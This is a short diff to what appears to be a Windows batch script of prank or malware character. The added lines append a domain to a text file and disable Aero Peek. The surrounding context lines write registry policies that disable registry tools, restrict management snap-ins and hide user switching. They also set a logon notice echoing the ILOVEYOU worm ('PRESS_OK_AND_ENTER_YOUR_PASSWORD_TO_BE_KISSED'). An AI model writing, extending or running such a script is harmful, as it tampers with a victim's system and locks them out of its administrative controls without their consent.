@@ -40,6 +40,7 @@ echo askvg.com >> note.txt
 echo freeconvert.com >> note.txt
 echo imgur.com >> note.txt
 echo icon-icons.com >> note.txt
+echo windows10forums.com >> note.txt
 echo en.wikiversity.org >> note.txt
 echo makeuseof.com >> note.txt
 echo tb.rg-adguard.net >> note.txt
@@ -182,6 +183,7 @@ reg ADD HKCU\Software\Policies\Microsoft\MMC /v RestrictToPermittedSnapins /t RE
 reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f
 reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
 reg ADD HKCU\Software\Microsoft\Windows /v SearchboxTaskbarMode /t REG_DWORD /d 0 /f
+reg ADD HKCU\Software\Microsoft\Windows\DWM /v EnableAeroPeek /t REG_DWORD /d 0 /f
 reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v legalnoticecaption /t REG_SZ /d GET_READY_TO_BE_KISSED! /f
 reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v legalnoticetext /t REG_SZ /d I_ALWAYS_LOVE_YOU!!!_PRESS_OK_AND_ENTER_YOUR_PASSWORD_TO_BE_KISSED_MY_FRIEND!!!_ILOVEYOU!!!_SOS!!!1 /f
 goto GoToTheBackrooms
